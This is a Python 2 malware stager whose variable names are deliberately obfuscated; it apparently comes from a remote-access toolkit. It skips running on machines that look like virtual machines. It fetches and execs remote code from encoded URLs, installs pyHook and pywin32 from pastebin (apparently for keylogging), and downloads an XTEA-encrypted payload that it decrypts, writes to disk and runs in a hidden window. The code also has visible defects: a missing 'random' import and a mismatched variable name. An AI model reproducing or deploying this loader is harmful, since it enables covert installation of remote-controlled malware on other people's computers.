from __future__ import print_function
import os
import sys
import json
import struct
import base64
import urllib
import subprocess

 
DEBUG = True


def run(*args, **kwargs):
    def decrypt(data, key):
        data    = __B64__(data)
        blocks  = [data[i * 8:((i + 1) * 8)] for i in range(len(data) // 8)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            u,v = __UNPACK__("!" + "2L", block)
            k   = __UNPACK__("!" + "4L", key)
            d,m = 0x9e3779b9L, 0xffffffffL
            sum = (d * 32) & m
            for _ in range(32):
                v   = (v - (((u << 4 ^ u >> 5) + u) ^ (sum + k[sum >> 11 & 3]))) & m
                sum = (sum - d) & m
                u   = (u - (((v << 4 ^ v >> 5) + v) ^ (sum + k[sum & 3]))) & m
            packed  = __PACK__("!" + "2L", u, v)
            output  = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
            vector  = block
            result.append(output)
        return "".join(result).rstrip("\x00")
    IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
    SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
    RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
    SeamlessGalacticSponges   = lambda x: print(str(x)) if DEBUG else ''
    AngryAquaticCat           = json.loads(urllib.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read()) if 'config' in kwargs else {}
    if 'f' not in kwargs and '__file__' in globals():
        AngryAquaticCat['f']  = bytes(IncontinentObtuseCucumber(__file__))
    GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
    if not len(GroovySophisticatedLemur):
        exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read()
        exec urllib.urlopen(SomberUnbecomingAmusement(AngryAquaticCat.get('l'))).read()
    else:
        try:
            os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
            for FoamyNonstopHistory, NobleRusticWalrus in AngryAquaticCat['t'][os.name][str(struct.calcsize('P') * 8)].items():
                if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                    if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                        if 'pyHook' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
                            ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
                            with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                            RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                            if os.path.isfile(ZonkedEnthusiasticTadpole):
                                os.remove(ZonkedEnthusiasticTadpole)
                        elif 'pypiwin32' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
                            ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
                            with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                            RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                            SilkyPerilousManifesto  = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
                            if os.path.isfile(SilkyPerilousManifesto):
                                RuthlessSpiffyTablecloth([SilkyPerilousManifesto, '-install'])
                            if os.path.isfile(ZonkedEnthusiasticTadpole):
                                os.remove(ZonkedEnthusiasticTadpole)
                        else:
                            try:
                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                            except Exception as e:
                                SeamlessGalacticSponges('Install error: {}'.format(str(e)))
                    else:
                        SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
                else:
                    SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
        finally:
            QuarrelsomeImportedAtom = decrypt(urllib.urlopen(SomberUnbecomingAmusement(AngryAquaticCat.get('u'))).read(), AngryAquaticCat.get('z'))
            LyingIdioticManicure    = QuarrelsomeImportedAtom + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AngryAquaticCat))
            EarnestUndulatingNipple = ''.join([random.choice([chr(i) for i in range(97,143) if chr(i).isalnum()]) for _ in range(random.randint(8,16))]) + '.py'
            with file(EarnestUndulatingNipple, 'w') as fp:
                fp.write(LyingIdiotManacure)
            info = subprocess.STARTUPINFO()
            info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
            info.wShowWindow = subprocess.SW_HIDE
            p = subprocess.Popen(EarnestUndulatingNipple, startupinfo=info, shell=True)


def main(*args, **kwargs):
    s = 'tasklist' if os.name is 'nt' else 'ps'
    c = 0 if os.name is 'nt' else -1
    if 'checkvm' in kwargs:
        if bool([i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in (kwargs.get('procs') or ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'])]) if (bool(kwargs.get('checkvm')) if 'checkvm' in kwargs else False) else bool([]):
            if DEBUG:
                print('aborting')
            return
    if 'config' in kwargs:
        return run(**kwargs)

if __name__ == '__main__':
    m = main(**{
  "a": "81547499566857937463", 
  "c": "80194446127549985092", 
  "b": "79965932444658643559", 
  "e": "78307486292777321027", 
  "d": "81472904329291720535", 
  "g": "81336687865394389318", 
  "k": "78307978800637761077", 
  "l": "81121075829415236930", 
  "q": "79959173599698569031", 
  "s": "81399447134546511973", 
  "t": "77809841759794002027", 
  "w": "77815713142069688900"
})
